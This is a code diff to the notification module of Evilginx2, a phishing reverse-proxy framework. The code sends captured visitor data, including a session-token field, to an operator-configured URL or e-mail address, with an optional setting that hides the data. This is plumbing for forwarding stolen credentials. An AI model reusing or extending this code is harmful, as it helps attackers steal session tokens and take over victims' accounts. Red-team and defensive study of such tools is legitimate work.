@@ -26,17 +26,25 @@ type Visitor struct {
 	Tokens  string `json:"tokens"`
 }
 
+//creates the body for the message or http request
+func NotifyGenerateBody(n *Notify, info interface{}) (body []byte, err error) {
+	if n.HideSensitive {
+		body := []byte("This is a Notification from Evilginx2. It does not contain any more information, because the HideSensitive Setting is active")
+		return body, nil
+	} else {
+		return json.Marshal(info)
+	}
+}
+
 // sets up a http.Request with correct Method.
-func NotifyReturnReq(n *Notify, body interface{}) (req http.Request, err error) {
+func NotifyReturnReq(n *Notify, body []byte) (req http.Request, err error) {
 	if n.Method == "GET" {
-		Body, _ := json.Marshal(body)
-		req, err := http.NewRequest(http.MethodGet, n.Url, bytes.NewBuffer(Body))
+		req, err := http.NewRequest(http.MethodGet, n.Url, bytes.NewBuffer(body))
 
 		return *req, err
 	}
 	if n.Method == "POST" {
-		Body, _ := json.Marshal(body)
-		req, err := http.NewRequest(http.MethodPost, n.Url, bytes.NewBuffer(Body))
+		req, err := http.NewRequest(http.MethodPost, n.Url, bytes.NewBuffer(body))
 
 		req.Header.Add("Content-Type", "application/json")
 		return *req, err
@@ -45,11 +53,15 @@ func NotifyReturnReq(n *Notify, body interface{}) (req http.Request, err error) 
 }
 
 // configures and sends the http.Request
-func NotifierSend(n *Notify, body interface{}) error {
+func NotifierSend(n *Notify, info interface{}) error {
 	log.Debug("Starting NotifierSend")
 
-	switch n.Method {
+	body, err := NotifyGenerateBody(n, info)
+	if err != nil {
+		log.Fatal("%v", err)
+	}
 
+	switch n.Method {
 	case "GET", "POST":
 		req, err := NotifyReturnReq(n, body)
 		if err != nil {
@@ -72,14 +84,11 @@ func NotifierSend(n *Notify, body interface{}) error {
 		return nil
 
 	case "E-Mail":
-		bodymarshaldjson, _ := json.Marshal(body)
-		bodystr := string(bodymarshaldjson)
-
 		m := gomail.NewMessage()
 		m.SetHeader("From", n.FromAddress)
 		m.SetHeader("To", n.Url)
 		m.SetHeader("Subject", "Evilginx2 Notification")
-		m.SetBody("text/plain", bodystr)
+		m.SetBody("text/plain", string(body))
 
 		// Adding additional Headers from the AuthHeader Config. Not necessarily for auth, but who knows what this might be useful for
 		if n.AuthHeaderName != "" && n.AuthHeaderValue != "" {
@@ -93,9 +102,7 @@ func NotifierSend(n *Notify, body interface{}) error {
 		log.Debug("Mail Notification sent to " + n.Url)
 
 		if err := d.DialAndSend(m); err != nil {
-			log.Error("Notifier E-Mail failed. Panic")
-			panic(err)
-			//TODO dont panic so hard to make it crash!
+			log.Fatal("Notifier E-Mail failed. %v", err)
 		}
 		return nil
 	}
